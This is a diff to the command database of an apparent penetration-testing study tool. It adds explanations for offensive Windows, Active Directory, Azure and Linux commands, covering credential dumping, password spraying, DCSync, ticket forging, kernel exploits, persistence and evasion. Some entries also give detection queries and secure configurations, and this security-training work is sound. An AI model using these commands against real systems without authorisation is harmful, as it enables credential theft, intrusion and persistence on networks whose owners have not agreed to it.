         "sentinel_kql": "DeviceProcessEvents\n| where FileName startswith \"bitlocker2john\" or ProcessCommandLine has \"bitlocker2john\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine\n| sort by Timestamp desc\n// extracts a BitLocker hash from a VHD locally; the subsequent hashcat crack is also offline",
         "sigma_rules": "no target-side telemetry (bitlocker2john runs on the attacker host)"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Extracts a BitLocker hash from a disk image and cracks it:\n  bitlocker2john -i <vhd_file>   parse the VHD/volume for crackable BitLocker hashes\n  > backup.hashes          save all of them\n  grep 'bitlocker\\$0' ... > backup.hash   keep only the password-hash line ($bitlocker$0)\nCrack backup.hash with hashcat -m 22100, then mount the unlocked volume with dislocker."
     },
     {
       "id": "ad-cme-groups",
@@ -13081,7 +13116,8 @@ const COMMAND_DATA = {
           "label": "PowerView Get-GPPAutologon",
           "command": "Get-GPPAutologon"
         }
-      ]
+      ],
+      "explain": "Hunts SYSVOL for autologon credentials stored in plaintext by Group Policy Preferences:\n  crackmapexec smb <dc_ip>  connect to the DC's SYSVOL over SMB\n  -u <user> -p <password>  authenticate as any domain user\n  -M gpp_autologin         parse GPP registry.pol for DefaultUserName/DefaultPassword autologon values\nUnlike cpassword these are stored in cleartext; -M gpp_password finds the encrypted cpassword variant instead."
     },
     {
       "id": "ad-cme-loggedon",
@@ -13382,7 +13418,8 @@ const COMMAND_DATA = {
           "label": "Pwn3d! hosts = local admin -> dump creds",
           "command": "crackmapexec smb <host> --local-auth -u administrator -H <nt_hash> --sam"
         }
-      ]
+      ],
+      "explain": "Sprays a recovered local-admin hash across a subnet to find password reuse:\n  crackmapexec smb         SMB module\n  --local-auth             authenticate against the local SAM, not the domain\n  <cidr>                   the subnet to sweep\n  -u administrator -H <nt_hash>   the local admin account and its NT hash\n  | grep +                 keep only successful logins\nPwn3d! means local admin on that host; add --sam to dump its hashes. Essential after cracking any local admin password."
     },
     {
       "id": "ad-cme-spray",
@@ -13497,7 +13534,8 @@ const COMMAND_DATA = {
           "label": "Spray one password across all users",
           "command": "crackmapexec smb <dc_ip> -u <userlist> -p '<Season2024>' | grep +"
         }
-      ]
+      ],
+      "explain": "Sprays one password against many domain users over SMB:\n  crackmapexec smb <dc_ip>  authenticate to the DC\n  -u <userlist>            try each username in this file\n  -p <password>            the single password sprayed to all of them\n  | grep +                 show only valid pairs\nCheck the lockout policy first (--pass-pol) - each failure logs Event 4625. Pwn3d! marks local admin; -H <nt_hash> sprays a hash instead."
     },
     {
       "id": "ad-cme-spider",
@@ -13758,7 +13796,8 @@ const COMMAND_DATA = {
           "label": "evasive-lsa dump (SafetyKatz)",
           "command": "SafetyKatz.exe \"sekurlsa::evasive-lsa /patch\" \"exit\""
         }
-      ]
+      ],
+      "explain": "Dumps credentials from LSASS memory with SafetyKatz (a minidump-based Mimikatz):\n  SafetyKatz.exe            run the packed Mimikatz\n  \"sekurlsa::logonpasswords\"   extract plaintext passwords, NTLM hashes, and Kerberos material for logged-on sessions\n  \"exit\"                    quit cleanly\nSwap the command for sekurlsa::ekeys (AES keys for overpass-the-hash), sekurlsa::tickets /export, or lsadump::sam (local SAM). Requires local admin/SeDebug."
     },
     {
       "type": "command",
@@ -13855,7 +13894,8 @@ const COMMAND_DATA = {
           "label": "Cookies too",
           "command": ".\\SharpChrome.exe cookies /unprotect"
         }
-      ]
+      ],
+      "explain": "Decrypts saved Chrome passwords using the current user's DPAPI keys:\n  .\\SharpChrome.exe logins   read Chrome's Login Data and decrypt it\n  /unprotect               use the logged-on user's DPAPI master key to reveal plaintext site passwords\nRun in the victim's context. cookies /unprotect grabs session cookies too (for session hijacking)."
     },
     {
       "type": "command",
@@ -13960,7 +14000,8 @@ const COMMAND_DATA = {
           "MITRE T1552.001",
           "OWASP A02:2021"
         ]
-      }
+      },
+      "explain": "Sweeps the filesystem for stored credentials in config files:\n  find /                   search from root\n  ! -path \"*/proc/*\"       skip /proc noise\n  -iname \"*config*\"        match any file with 'config' in the name (case-insensitive)\n  -type f 2>/dev/null      files only, discard permission errors\nInspect hits like wp-config.php and app configs, plus SSH key directories - recovered keys/passwords enable lateral movement or direct root."
     },
     {
       "type": "command",
@@ -14080,7 +14121,8 @@ const COMMAND_DATA = {
           "label": "Crack it",
           "command": "hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt"
         }
-      ]
+      ],
+      "explain": "Cracks a found KeePass database master password offline:\n  keepass2john <kdbx_file>   extract a crackable hash from the .kdbx\n  > keepass.hash           save it\n  hashcat -m 13400 keepass.hash rockyou.txt   brute-force it (mode 13400 = KeePass)\nRecovering the master password unlocks every credential stored in the database."
     },
     {
       "type": "command",
@@ -14186,7 +14228,8 @@ const COMMAND_DATA = {
           "label": "Decrypt it (only as the same user/host that saved it)",
           "command": "$c = Import-Clixml '<cred_xml>'; $c.GetNetworkCredential().Password"
         }
-      ]
+      ],
+      "explain": "Decrypts a PSCredential exported with Export-Clixml (DPAPI-bound to the saving user):\n  $c = Import-Clixml -Path '<cred_xml>'   load the saved credential object\n  $c.GetNetworkCredential().Password   read the plaintext password\nOnly works when run as the same user on the same host that saved it (DPAPI). Find such files by grepping XML for System.Management.Automation.PSCredential."
     },
     {
       "type": "command",
@@ -14287,7 +14330,8 @@ const COMMAND_DATA = {
           "label": "Write to file",
           "command": ".\\lazagne.exe all -oN -output C:\\Users\\Public"
         }
-      ]
+      ],
+      "explain": "Recovers locally stored application passwords in one run:\n  .\\lazagne.exe all        run every module (browsers, mail clients, Wi-Fi, RDP, databases, and more)\nEach module reads its app's own credential store in the current user's context; use browsers to scope it, or -oN -output to write results to a file."
     },
     {
       "type": "command",
@@ -14388,7 +14432,8 @@ const COMMAND_DATA = {
           "label": "All users' history",
           "command": "Get-ChildItem C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt | gc"
         }
-      ]
+      ],
+      "explain": "Reads the PSReadLine history file, which often holds passwords typed on the command line:\n  gc (Get-PSReadLineOption).HistorySavePath   print your own console history\nThe variation reads every user's ConsoleHost_history.txt under C:\\Users\\*\\...\\PSReadline\\ - credentials passed as arguments to scripts/cmdlets frequently sit there in cleartext."
     },
     {
       "type": "command",
@@ -14491,7 +14536,8 @@ const COMMAND_DATA = {
           "MITRE T1078"
         ],
         "evasion": "Copy the credential store (browser Login Data, .kdbx, PSReadline history) and decrypt/crack it OFFLINE rather than running signatured binaries (LaZagne/SharpChrome) on the host; scope searches to likely paths to limit disk I/O; use built-in cmdlets over dropped tools."
-      }
+      },
+      "explain": "Hunts common registry stashes of cleartext credentials:\n  reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"   read Winlogon autologon (DefaultPassword)\nThe variations cover PuTTY saved sessions (proxy creds under HKCU\\...\\PuTTY\\Sessions) and Wi-Fi profiles (netsh wlan show profile <SSID> key=clear) - each can expose a recoverable password."
     },
     {
       "type": "command",
@@ -14605,7 +14651,8 @@ const COMMAND_DATA = {
           "label": "Registry passwords",
           "command": "reg query HKLM /f password /t REG_SZ /s"
         }
-      ]
+      ],
+      "explain": "Greps the Windows filesystem for credentials in config and script files:\n  findstr /S               recurse into subdirectories\n  /I                       case-insensitive\n  /M                       print only matching filenames\n  /C:\"password\"           the literal string to find\n  *.txt *.ini *.cfg *.config *.xml   the file types to scan\nAlso hunt by name/extension (.rdp, .vnc, unattend.xml, web.config) and reg query HKLM /f password /t REG_SZ /s for registry-stored secrets."
     },
     {
       "type": "command",
@@ -14707,7 +14754,8 @@ const COMMAND_DATA = {
           "label": "Thorough (search filesystem too)",
           "command": "Invoke-SessionGopher -Thorough"
         }
-      ]
+      ],
+      "explain": "Extracts saved remote-session secrets from the registry and profiles:\n  Invoke-SessionGopher     harvest stored credentials for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP\n  -Target <hostname>       run against this host\nMany of these tools store connection passwords recoverably; -AllDomain sweeps every domain host, -Thorough also searches the filesystem for key/session files."
     },
     {
       "type": "command",
@@ -14811,7 +14859,8 @@ const COMMAND_DATA = {
           "label": "Locate the DB first",
           "command": "gci C:\\Users\\*\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_*\\LocalState\\plum.sqlite"
         }
-      ]
+      ],
+      "explain": "Reads Windows Sticky Notes content, where users often keep passwords:\n  Invoke-SqliteQuery       PSSQLite query helper\n  -Database $db            the plum.sqlite notes database\n  -Query \"SELECT Text FROM Note\"   pull every note's text\n  | ft -wrap               display it fully\nLocate the DB under C:\\Users\\*\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_*\\LocalState\\, or just run strings on the -wal file."
     },
     {
       "type": "command",
@@ -14919,7 +14968,8 @@ const COMMAND_DATA = {
           "label": "Run as the saved user (no password prompt)",
           "command": "runas /savecred /user:<domain>\\<user> cmd"
         }
-      ]
+      ],
+      "explain": "Reuses saved Windows credentials without seeing the password:\n  cmdkey /list             list stored credentials (targets and usernames)\nIf a useful entry exists, runas /savecred /user:<domain>\\<user> cmd launches a process as that stored user - potentially a privileged account - using the saved secret."
     },
     {
       "type": "command",
@@ -15021,7 +15071,8 @@ const COMMAND_DATA = {
           "label": "Check domain user descriptions for passwords",
           "command": "Get-DomainUser -Properties description | ?{$_.description -match 'pass|pw'}"
         }
-      ]
+      ],
+      "explain": "Checks user Description fields, where admins sometimes stash passwords:\n  Get-LocalUser            list local accounts (pipe to select Name,Description to read their descriptions)\nA free credential when present. The variations check domain user descriptions via PowerView (Get-DomainUser -Properties description | ? {$_.description -match 'pass|pw'})."
     },
     {
       "id": "cdsa-m06-credentials-in-objects",
@@ -15085,7 +15136,8 @@ const COMMAND_DATA = {
           "rel": "next",
           "note": "If exposed account has replication rights, DCSync is the next step."
         }
-      ]
+      ],
+      "explain": "Searches AD user object attributes for passwords admins wrongly assume are protected:\n  SearchUserClearTextInformation   PowerView-style function that reads Description/Info fields on every user\n  -Terms \"pass\"            the keyword to match in those fields\nEvery domain user can read most object properties, so a password in a Description is readable by anyone. Detect via unusual bulk directory reads."
     },
     {
       "id": "cdsa-m06-credentials-in-shares",
@@ -15190,7 +15242,8 @@ const COMMAND_DATA = {
           "label": "Connect to hidden share via smbclient (from Kali)",
           "command": "smbclient \\\\<TARGET_IP>\\<SHARE_NAME> -U <DOMAIN>/<USERNAME>%<PASSWORD>"
         }
-      ]
+      ],
+      "explain": "Enumerates reachable domain shares to hunt for credential-bearing scripts and configs:\n  Invoke-ShareFinder        PowerView share discovery across the domain\n  -domain <domain>         the domain to enumerate\n  -ExcludeStandard         skip default admin shares (C$, ADMIN$, IPC$)\n  -CheckShareAccess        only list shares your account can actually read\nThen findstr the reachable shares for pass/pw in .ini/.config/.ps1 files - admins often leave net use/runas creds in scripts open to Domain Users."
     },
     {
       "type": "command",
@@ -15326,7 +15379,8 @@ const COMMAND_DATA = {
           "MITRE T1053.003",
           "MITRE T1543"
         ]
-      }
+      },
+      "explain": "Watches for root cron jobs without needing root, so you can abuse a writable one:\n  ./pspy64                 monitor process creation and scheduled tasks in real time (no privileges needed)\n  -pf                      print commands and file-system events\n  -i 1000                  poll every 1000 ms\nWhen you spot a root cron running a world-writable script, append a reverse shell to that script (back up the original first) and wait for the next run."
     },
     {
       "id": "cross-compile-exploit",
@@ -15658,7 +15712,8 @@ const COMMAND_DATA = {
         "wordlist",
         "password",
         "generation"
-      ]
+      ],
+      "explain": "Generates a custom wordlist from a known pattern:\n  crunch <min> <max>       min and max candidate length\n  <charset>                the characters to use\n  -t <pattern>             a template (% = digit, @ = lowercase, ^ = symbol, , = uppercase)\n  -o <output_file>         write the list\nEssential for targeted brute force when you know partial structure (e.g. -t Lab%%% for Lab plus three digits); pipe straight into hashcat --stdin or hydra -P -."
     },
     {
       "id": "cupp-profile",
@@ -15747,7 +15802,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Weak domain password policy:\nGet-ADDefaultDomainPasswordPolicy\n# MinPasswordLength:    8    <-- too short\n# PasswordHistoryCount: 0    <-- no history, password reuse allowed\n# ComplexityEnabled:    False <-- no complexity\n# LockoutThreshold:     0    <-- NO lockout\n\n# Local SAM policy (workgroup machines):\n# Control Panel -> Local Security Policy -> Account Policies -> Password Policy\n# Same weak defaults as above",
         "secure_config": "# Set a strong domain password policy:\nSet-ADDefaultDomainPasswordPolicy -Identity corp.local \\\n    -MinPasswordLength 14 \\\n    -PasswordHistoryCount 24 \\\n    -ComplexityEnabled $true \\\n    -MaxPasswordAge 90.00:00:00 \\\n    -LockoutThreshold 5 \\\n    -LockoutDuration 00:30:00 \\\n    -LockoutObservationWindow 00:30:00\n\n# Fine-Grained PSO for privileged accounts (stricter):\nNew-ADFineGrainedPasswordPolicy -Name PrivilegedPSO \\\n    -MinPasswordLength 20 -PasswordHistoryCount 48 \\\n    -ComplexityEnabled $true -LockoutThreshold 3 \\\n    -LockoutDuration 01:00:00 -Precedence 1\nAdd-ADFineGrainedPasswordPolicySubject PrivilegedPSO -Subjects 'Domain Admins'\n\n# Deploy Azure AD Password Protection (blocks common passwords on-prem too)\n# Enable Microsoft Entra ID Smart Lockout"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Builds a personalized password list from facts about a target:\n  cupp -i                  run the interactive interview (name, birthdate, pet, company, etc.)\nCUPP combines and mutates the answers into likely passwords. Pair it with username-anarchy for the username side of a targeted brute force."
     },
     {
       "id": "custom-brute-script",
@@ -15820,7 +15876,8 @@ const COMMAND_DATA = {
       ],
       "primary_cert": "CPTS",
       "source": "CPTS Module 16: Login Brute Forcing",
-      "exam": "exam-ok"
+      "exam": "exam-ok",
+      "explain": "A short Python loop to brute-force a custom auth flow hydra/medusa cannot model:\n  for pin in range(10000)  iterate all 4-digit PINs\n  requests.get(f'http://<ip>:<port>/pin?pin={pin:04d}')   submit each candidate\nDetect success by status code, response length, or a keyword in the body. The variations show a POST dictionary attack; adapt for JSON, tokens, or multi-step flows."
     },
     {
       "type": "command",
@@ -15935,7 +15992,8 @@ const COMMAND_DATA = {
           "label": "Run the arbitrary-file-move exploit",
           "command": "CVE-2020-0668.exe <payload_exe> \"<protected_target_path>\""
         }
-      ]
+      ],
+      "explain": "Exploits a Windows service-tracing symlink flaw to overwrite a SYSTEM binary:\n  CVE-2020-0668.exe        the arbitrary-file-move exploit\n  <payload_exe>            the file to plant\n  \"<protected_target_path>\"   the SYSTEM-owned path to overwrite (e.g. a service binary)\nReplace a SYSTEM-run executable (like Mozilla Maintenance Service) with your payload, then start that service to execute it as SYSTEM."
     },
     {
       "id": "ad-cve-2025-24071",
@@ -16033,7 +16091,8 @@ const COMMAND_DATA = {
           "a": "Network: outbound SMB (TCP 445) from a workstation to an external/unexpected host. Host: creation of a .library-ms file (Sysmon 11) followed immediately by that SMB egress (Sysmon 3). Blocking outbound 445 and restricting NTLM prevents the leak outright.",
           "role": "soc"
         }
-      ]
+      ],
+      "explain": "Starts an NTLM capture listener so a crafted .library-ms file can coerce a victim's SMB authentication (Windows Explorer auto-resolves the embedded UNC path on mere extraction/preview, no double-click):\n  responder -I <interface>   listen on this network interface, answering the UNC/SMB request and harvesting the auth\nWhen the target browses the folder, Explorer connects to your listener and Responder captures the account's NetNTLMv2 hash - crack it offline (hashcat -m 5600) or relay it."
     },
     {
       "id": "cwes-methodology",
@@ -16329,7 +16388,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Non-DC accounts granted Replicating Directory Changes rights (often from legacy AD sync tools, Azure AD Connect, or misconfigured delegation). No audit on DCSync-specific ACL modifications. MDI not deployed.",
         "vulnerable_config": "# Check who has DCSync rights (non-DCs):\n(Get-ObjectAcl 'DC=corp,DC=local' -ResolveGUIDs | Where-Object {\n  $_.ObjectAceType -match 'DS-Replication-Get-Changes' -and\n  $_.IdentityReference -notmatch 'Domain Controllers'\n}) | Select-Object IdentityReference, ObjectAceType\n# Any non-DC account listed = DCSync capable\n\n# Azure AD Connect account often has DCSync rights by design:\n# MSOL_* account - if compromised, instant DCSync",
         "secure_config": "# Audit DCSync rights quarterly:\nGet-ObjectAcl 'DC=corp,DC=local' -ResolveGUIDs | Where-Object {\n  $_.ObjectAceType -match 'DS-Replication-Get-Changes' -and\n  $_.IdentityReference -notmatch 'Enterprise Domain Controllers'\n} | ForEach-Object { Write-Warning \"Non-DC DCSync right: $($_.IdentityReference)\" }\n\n# Remove unexpected DCSync rights:\n$path = 'AD:\\DC=corp,DC=local'\n$acl = Get-Acl -Path $path\n$ace = $acl.Access | Where-Object { $_.IdentityReference -eq 'CORP\\BadAccount' -and $_.ObjectType -match '1131f6aa' }\n$acl.RemoveAccessRule($ace)\nSet-Acl -Path $path -AclObject $acl\n\n# Enable DCSync detection in SIEM:\n# EventID=4662 AND ObjectType='19195a5b-6da0-11d0-afd3-00c04fd930c9' AND\n# Properties contains '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' AND\n# SubjectUserName NOT IN (domain controller machine accounts) → CRITICAL ALERT\n\n# MDI automatically alerts on DCSync from non-DC accounts"
-      }
+      },
+      "explain": "Impersonates a DC's replication to pull password hashes for any account, without touching LSASS:\n  SafetyKatz.exe            Mimikatz\n  \"lsadump::dcsync /user:<domain>\\krbtgt\"   ask a DC to replicate this account's secrets (krbtgt = keys to forge golden tickets)\n  \"exit\"                    quit\nRequires Replicating Directory Changes (DCSync) rights. Use /all /csv to dump every hash, or run impacket-secretsdump -just-dc from Linux."
     },
     {
       "id": "cdsa-m06-dcsync",
@@ -16431,7 +16491,8 @@ const COMMAND_DATA = {
           "label": "Pass-the-Hash with obtained NTLM (Kali)",
           "command": "impacket-wmiexec <DOMAIN>/Administrator@<DC_IP> -hashes :<NTLM_HASH>"
         }
-      ]
+      ],
+      "explain": "Impersonates a DC's replication with Mimikatz to pull an account's password hash:\n  lsadump::dcsync          request Directory Replication of secrets\n  /domain:<domain>         the target domain\n  /user:Administrator      the account whose hash to replicate (use /user:krbtgt to prep a Golden Ticket, /all to dump everything - very loud)\nRequires Replicating Directory Changes (All) rights. Detect via Event 4662 with the replication GUIDs from a non-DC. Pass the obtained NTLM with wmiexec."
     },
     {
       "id": "cdsa-m10-debugging-x64dbg",
@@ -16617,7 +16678,8 @@ const COMMAND_DATA = {
         "sentinel_kql": "DeviceProcessEvents\n| where FileName startswith \"creds\" or ProcessCommandLine has \"creds\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine\n| sort by Timestamp desc\n// creds-search queries a local default-credentials database; detection is only in the subsequent login attempt against the target",
         "sigma_rules": "no target-side telemetry (creds runs on the attacker host)"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Looks up factory default credentials for a product:\n  creds search <product>   query the DefaultCreds-cheat-sheet database for that vendor/product's default user:pass pairs\nAlways try defaults against appliances, routers, databases, and web apps before brute forcing - they are often unchanged."
     },
     {
       "id": "cdsa-m14-network-attack-detection",
@@ -17069,7 +17131,8 @@ const COMMAND_DATA = {
           "label": "Diamond ticket via credentials (/createnetonly)",
           "command": "Rubeus.exe diamond /krbkey:<aes256_krbtgt> /user:student1 /password:<password> /enctype:aes /ticketuser:administrator /domain:<domain> /dc:<dc_host> /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt"
         }
-      ]
+      ],
+      "explain": "Forges a Diamond Ticket - request a real TGT and rewrite its PAC, so it carries valid DC signatures (evades golden-ticket detection):\n  diamond                   modify a legitimately issued TGT\n  /tgtdeleg                 obtain a real TGT for the current user without their password\n  /ticketuser:<user> /ticketuserid:<rid>   the user and RID the modified ticket is for\n  /groups:512              inject Domain Admins (RID 512) into the PAC\n  /krbkey:<aes256_key>     the krbtgt AES256 key to re-sign the PAC\n  /nowrap                   single-line output\nInject it (/ptt) and you are DA with a ticket that looks KDC-issued."
     },
     {
       "id": "directory-traversal",
@@ -17274,7 +17337,8 @@ const COMMAND_DATA = {
           "OWASP A06:2021"
         ],
         "evasion": "Compile off-target and transfer only the final ELF; run once and clean it up; many public PoCs are unstable - verify the kernel/arch match before firing to avoid a panic."
-      }
+      },
+      "explain": "Runs the Dirty Pipe (CVE-2022-0847) exploit to overwrite read-only files as an unprivileged user (kernels 5.8-5.17):\n  ./exploit-1              rewrite /etc/passwd to give root a known password, then su to root\nCheck uname -r is in range and build with compile.sh first. exploit-2 instead hijacks a chosen SUID binary (./exploit-2 /usr/bin/sudo) to pop a root shell - clean up /tmp/sh after."
     },
     {
       "type": "command",
@@ -17603,7 +17667,8 @@ const COMMAND_DATA = {
         "elastic_kql": "process.name:dislocker*",
         "sentinel_kql": "DeviceProcessEvents\n| where FileName startswith \"dislocker\" or ProcessCommandLine has \"dislocker\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine\n| sort by Timestamp desc\n// unlocks a BitLocker volume with a recovered key; local operation, no network signal",
         "sigma_rules": "no target-side telemetry (dislocker runs on the attacker host)"
-      }
+      },
+      "explain": "Mounts a BitLocker volume on Linux once you have the recovery key:\n  sudo dislocker            decrypt the BitLocker partition\n  /dev/loop0p2             the BitLocker partition (attach the image with losetup -f -P first)\n  -u<recovery_key>         unlock with the recovery password/key\n  -- /media/bitlocker      expose the decrypted virtual file here\nThen mount /media/bitlocker/dislocker-file to read the drive - the counterpart to cracking, used once you have the key."
     },
     {
       "type": "command",
@@ -18983,7 +19048,8 @@ const COMMAND_DATA = {
           "MITRE T1543.003",
           "MITRE T1574.001"
         ]
-      }
+      },
+      "explain": "Abuses DnsAdmins membership to run a DLL as SYSTEM on a DC:\n  dnscmd.exe /config       change DNS server configuration\n  /serverlevelplugindll C:\\path\\adduser.dll   register a custom plugin DLL the DNS service loads on restart\nThe DNS service runs as SYSTEM on a DC, so restarting it loads your DLL (e.g. one that adds a domain admin) with SYSTEM privilege."
     },
     {
       "type": "command",
@@ -19074,7 +19140,8 @@ const COMMAND_DATA = {
           "MITRE T1040"
         ],
         "evasion": "Use passive sources first (cert transparency, public records); rate-limit active zone-transfer/brute attempts; a single AXFR attempt is quiet, brute-forcing is not."
-      }
+      },
+      "explain": "Alternative DnsAdmins abuse - hijack WPAD for credential capture:\n  Add-DnsServerResourceRecordA   add a DNS A record\n  -Name wpad               the Web Proxy Auto-Discovery name clients look up\n  -ZoneName <domain> -ComputerName <dc>   the zone and DC to write it on\n  -IPv4Address <lhost>     point wpad at your host\nAfter disabling the Global Query Block List, domain clients route proxy auto-config through you, enabling credential capture / MITM."
     },
     {
       "id": "dnscat2",
@@ -19544,7 +19611,8 @@ const COMMAND_DATA = {
           "label": "PowerView domain/password policy",
           "command": "Get-DomainPolicyData | select -ExpandProperty SystemAccess"
         }
-      ]
+      ],
+      "explain": "Reads the domain password policy over an unauthenticated (null) SMB session:\n  crackmapexec smb <dc_ip>  connect to the DC over SMB\n  -u '' -p ''              null session (empty username and password)\n  --pass-pol               dump the account lockout threshold, observation window, and minimum length\nKnowing the lockout threshold and window lets you password-spray safely (stay one attempt under the threshold per window)."
     },
     {
       "id": "crtp-password-spray",
@@ -19635,7 +19703,8 @@ const COMMAND_DATA = {
         "misconfiguration": "No account lockout (LockoutThreshold = 0). Common passwords in use (Welcome1, Seasonal+Year patterns). No MFA. Azure AD Password Protection not deployed. No SIEM correlation of failed-auth patterns.",
         "vulnerable_config": "# Domain policy with no lockout:\nGet-ADDefaultDomainPasswordPolicy\n# LockoutThreshold : 0 - unlimited spray possible\n\n# Common predictable passwords in enterprise:\n# Welcome1, Winter2024!, Company@123, [CompanyName]1!, Season+Year\n\n# No MFA enforcement:\n# Users authenticate with password only - single factor",
         "secure_config": "# Account lockout policy:\nSet-ADDefaultDomainPasswordPolicy -Identity corp.local -LockoutThreshold 5 -LockoutObservationWindow (New-TimeSpan -Minutes 30) -LockoutDuration (New-TimeSpan -Minutes 30)\n\n# Azure AD Password Protection (blocks common passwords + custom banned list):\n# AAD portal → Security → Authentication Methods → Password Protection\n# → Enable on-premises: Yes  (deploys agent to DCs)\n# → Custom banned passwords: [CompanyName], [Seasons], Welcome, Password\n\n# SIEM rule:\n# (EventID=4625 OR EventID=4771) FROM same_source_ip TO >10 distinct accounts IN 5min → ALERT\n\n# MDI: 'Password spray attack' detection alert enabled by default"
-      }
+      },
+      "explain": "Sprays one password across many usernames over Kerberos to avoid lockouts:\n  kerbrute passwordspray    send one AS-REQ per user (quiet, no SMB logon events)\n  -d <domain>              the target domain\n  --dc <dc_ip>             the Domain Controller to authenticate against\n  <userlist>               the file of usernames to try\n  '<password>'             the single password sprayed against all of them\nA KDC_ERR_PREAUTH_SUCCESS response means valid creds - stay under the lockout threshold by spraying one password per observation window."
     },
     {
       "id": "ad-shadow-vshadow",
@@ -19780,7 +19849,8 @@ const COMMAND_DATA = {
           "label": "Extract all domain hashes offline",
           "command": "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL"
         }
-      ]
+      ],
+      "explain": "Extracts every domain hash by shadow-copying the DC volume with the Windows SDK vshadow tool:\n  vshadow.exe -nw -p C:    create a persistent (-p), no-writers (-nw) shadow copy of C:\n  robocopy /b \\\\?\\GLOBALROOT\\...\\ntds.dit   copy NTDS.dit out of the snapshot in backup mode (bypasses the AD lock)\n  reg.exe save hklm\\system   save the SYSTEM hive for the boot key\n  impacket-secretsdump -ntds ... -system ... LOCAL   decrypt offline\nEnd result: NT hashes for the whole domain. diskshadow is a scriptable alternative."
     },
     {
       "id": "ad-domainpasswordspray",
@@ -19893,7 +19963,8 @@ const COMMAND_DATA = {
       ],
       "tools": [
         "DomainPasswordSpray"
-      ]
+      ],
+      "explain": "Sprays a password across the domain from a Windows host, respecting lockout:\n  Invoke-DomainPasswordSpray   pulls the user list from AD automatically\n  -Password <password>     the single password to spray\n  -OutFile spray_success   save hits\n  -ErrorAction SilentlyContinue   suppress errors\nBy default it honors the domain lockout policy so you do not lock accounts; best when you already have a Windows foothold and no Linux box on-segment."
     },
     {
       "id": "dnn-admin-rce",
@@ -20828,7 +20899,8 @@ const COMMAND_DATA = {
           "label": "Enable DSRM logon behavior (reg add)",
           "command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f"
         }
-      ]
+      ],
+      "explain": "Enables the DC's local DSRM administrator for network logon - a persistence account whose hash is not tied to AD password resets:\n  New-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\'   the LSA key on the DC\n  -Name 'DsrmAdminLogonBehavior'   the value that governs DSRM logon\n  -Value 2                 allow the DSRM account to log on over the network\n  -PropertyType DWORD      registry value type\nDump the DSRM hash (lsadump::lsa /patch), set this, then pass-the-hash as the DC's local Administrator to that DC."
     },
     {
       "id": "cdsa-m10-dynamic-analysis",
@@ -21779,7 +21851,8 @@ const COMMAND_DATA = {
           "label": "Open the remote session",
           "command": "Enter-PSSession -ComputerName <target> -Credential $cred"
         }
-      ]
+      ],
+      "explain": "Opens an interactive PowerShell remoting session (WinRM) from a Windows foothold - the native Evil-WinRM:\n  $cred = New-Object ...PSCredential('<domain>\\<user>', <secure password>)   build a credential object\n  Enter-PSSession -ComputerName <target> -Credential $cred   open the remote shell as that user\nUse when operating from Windows and you do not need Evil-WinRM's upload/download helpers; New-PSSession keeps a reusable session object."
     },
     {
       "id": "azure-app-credential-abuse",
@@ -21876,7 +21949,8 @@ const COMMAND_DATA = {
         "misconfiguration": "App owners unrestricted; privileged apps/SPs (directory roles or Owner/Contributor RBAC) whose ownership is loosely controlled; no alerting on credential additions.",
         "vulnerable_config": "# Compromised user owns an app that has a directory role -> add a secret and become that app:\nAdd-MgApplicationPassword -ApplicationId <app_obj_id>   # then log in as the SP",
         "secure_config": "# Restrict app registration ownership + use Entra app management policies to limit secret creation;\n# alert on passwordCredential/keyCredential additions; least-privilege app role assignments; review owners."
-      }
+      },
+      "explain": "Adds a new client secret to an Entra application you own, then authenticates as its service principal:\n  Add-MgApplicationPassword   generate and attach a fresh client secret\n  -ApplicationId \"<app_object_id>\"   the application object to add the secret to\n  | ConvertTo-Json         print the returned secret so you can capture it\nIf the app/SP holds directory roles or Azure RBAC, this is both escalation and persistence - the secret authenticates without MFA and survives user password resets."
     },
     {
       "id": "azure-entra-enum",
@@ -22289,7 +22363,8 @@ const COMMAND_DATA = {
       "mitre": [
         "T1083"
       ],
-      "exam": "exam-ok"
+      "exam": "exam-ok",
+      "explain": "Inspects mounts and storage for escalation material:\n  cat /etc/fstab           show configured mounts - network-share entries sometimes contain credentials\nThe variations add df -h/lsblk (block devices) and find for hidden files/dirs, which often hold keys, configs, and history worth reading."
     },
     {
       "type": "command",
@@ -22379,7 +22454,8 @@ const COMMAND_DATA = {
           "HTB M25",
           "MITRE T1083"
         ]
-      }
+      },
+      "explain": "Recursively hunts the filesystem for a flag or keyword:\n  grep -r 'HTB{'           search recursively for the flag prefix (swap for any keyword)\n  / 2>/dev/null            start at root, discard permission-denied noise\nHandy on lab/exam boxes once you have read access, to confirm you can reach a flag or locate secrets."
     },
     {
       "type": "command",
@@ -22469,7 +22545,8 @@ const COMMAND_DATA = {
           "MITRE T1548.001",
           "MITRE T1548.003"
         ]
-      }
+      },
+      "explain": "Auto-flags installed binaries that GTFOBins documents an escalation for:\n  curl -s https://gtfobins.github.io/gtfobins.json | jq -r 'keys[]'   pull every GTFOBins entry name\n  grep -q \"$i\" installed_pkgs.list   check each against your installed-packages list\n  echo \"Check GTFO: $i\"    print the ones present on the target\nEach match is a candidate for a SUID/sudo/shell-escape technique - look it up on GTFOBins."
     },
     {
       "type": "cheatsheet",
@@ -22606,7 +22683,8 @@ const COMMAND_DATA = {
         "T1033",
         "T1082"
       ],
-      "exam": "exam-ok"
+      "exam": "exam-ok",
